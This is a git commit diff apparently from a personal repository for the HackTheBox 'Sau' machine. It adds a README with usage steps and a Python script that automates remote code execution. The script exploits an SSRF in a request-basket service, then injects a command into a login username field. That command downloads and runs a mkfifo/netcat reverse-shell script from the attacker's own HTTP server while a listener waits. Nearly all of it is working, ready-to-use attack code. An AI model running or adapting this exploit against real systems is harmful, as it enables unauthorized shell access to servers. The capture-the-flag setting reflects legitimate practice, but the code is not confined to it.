bb37332239175a63260bc84789cb95bcf903fda4
mikel <mikelgoti@gmail.com>
2023-07-20 00:29:10 +0200

    The RCE works fine.

--- README.md
+++ README.md
@@ -1,2 +1,77 @@
-# SAU-HTB-RCE
+# SAU Machine Hackthebox
+
+## Remote Code Execution (RCE)
+
 Simple sau machine RCE to gain a shell.
+
+---
+
+### HOW TO USE IT
+
+Download the `repository` :
+
+```bash
+git clone https://github.com/mikelgoti/SAU-HTB-RCE.git
+```
+
+Or just download the `sau_rce.py` .
+
+
+
+Travel to the directory where you download the `script` and execute it with python:
+
+```bash
+python sau_rce.py -u <sau_machine_ip> -y <your_ip> -p <port_for_listener>
+```
+
+## EXAMPLES
+
+
+
+![example1.png](C:\Users\mikel\Desktop\SAU-HTB-RCE\images\example1.png)
+
+
+
+![example2.png](C:\Users\mikel\Desktop\SAU-HTB-RCE\images\example2.png)
+
+
+
+---
+
+## Not working ?
+
+If the script is not running properly, it could be because you haven't installed one of these modules for Python:
+
++ import string
+
++ import random
+
++ import requests
+
++ import os
+
++ import threading
+
++ import time
+
++ import argparse
+
+Install the missing modules with pip in your python enviroment and try it again.
+
+
+
+Another reason could be that it's taking too much time to make the request, so you would need to increase this parameter to `10`.
+
+![example3.png](C:\Users\mikel\Desktop\SAU-HTB-RCE\images\example3.png)
+
+
+
+Lastly, ensure that no other program on your computer is using port 8003, as this port needs to be available for python server.
+
+
+
+---
+
+## Note
+
+`Don't worry about the 'Terminated' word showing once you've got the shell. It's because the Python server thread was closed.`
--- sau_rce.py
+++ sau_rce.py
@@ -4,29 +4,25 @@ import requests
 import os
 import threading
 import time
+import argparse
 
+parser = argparse.ArgumentParser(description="Programa para configurar conexiones.")
+parser.add_argument('-u', '--sau-ip', dest='victim_ip', required=True, help="Ip of the sau machiene.")
+parser.add_argument('-y', '--your-ip', dest='attacker_ip', required=True, help="Your ip.")
+parser.add_argument('-p', '--port', dest='port_listener', type=int, required=True, help="Port for your nc listener.")
+args = parser.parse_args()
 
-def printResponse(respuesta):
-    print(respuesta.status_code)
-    print(respuesta.reason)
-    print(respuesta.headers)
-    print(respuesta.text)
-    print()
+victim = args.victim_ip
+attacker = args.attacker_ip
+nc_port = args.port_listener
 
-
-def extract_token(token):
-    tokencito = token.split(":")[1]
-    tokencito = tokencito.split("}")[0]
-    return tokencito
-
-
-url_vulnerable_service = "http://10.10.11.224:55555/"
-ssrf_url = "http://10.10.11.224:55555/api/baskets/"
-payload = "http://127.0.0.1:80/"  # According to nmap port 80 is filtered. That means the firewall is blocking por 80. Which means it could be some web service.
+sau_web_service_port = "55555"
+localhost = "127.0.0.1"
+url_vulnerable_service = f"http://{victim}:{sau_web_service_port}/"
+ssrf_url = f"http://{victim}:{sau_web_service_port}/api/baskets/"
+payload = f"http://{localhost}:80/"  # According to nmap port 80 is filtered. That means the firewall is blocking por 80. Which means it could be some web service.
 
 range_basket_name = 10
-
-stop_thread = False
 
 # choose from all lowercase letter
 letters = string.ascii_lowercase
@@ -48,26 +44,26 @@ if r.status_code == 201:
     r = requests.request(method="GET", url=url_vulnerable_service + basket_name)
 
     if r.status_code == 200:
-        print("Web service found!!! With a request from inside the machine.")
-        
-        nc_thread = threading.Thread(target=os.system, args=[f"nc -lvnp 2314"])
-        nc_thread.start()
+        print(f"Web service found inside {victim} -> {localhost}:80")
 
+        nc_thread = threading.Thread(target=os.system, args=[f"nc -lvnp {nc_port}"])
+        nc_thread.start()
         nc_thread.join(timeout=1)
-        
-        # server_thread = threading.Thread(target=os.system, args=[f"python -m http.server {8003}"])
-        server_thread = threading.Thread(target=os.system, args=[f"python -m http.server {8003}"])
+
+        server_thread = threading.Thread(target=os.system, args=[f"python -m http.server 8003"])
         server_thread.start()
-        
+
         time.sleep(1)
-        
-        os.system("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.242 2314 >/tmp/f' > rev.sh | chmod +x rev.sh")
-        attack_thread = threading.Thread(target=os.system, args=[f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://10.10.14.242:8003/rev.sh | bash`'"])
+
+        os.system(f"echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker} {nc_port} >/tmp/f' > rev.sh | chmod +x rev.sh")
+        attack_thread = threading.Thread(target=os.system, args=[f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://{attacker}:8003/rev.sh | bash`'"])
         attack_thread.start()
+        print("Trying to explote...")
 
         attack_thread.join(timeout=10)
 
         os.system("kill $(lsof -i :8003 | grep LISTEN | awk '{print $2}')")
+        os.system("rm rev.sh")
     else:
         print("The port 80 is closed.")
 else:
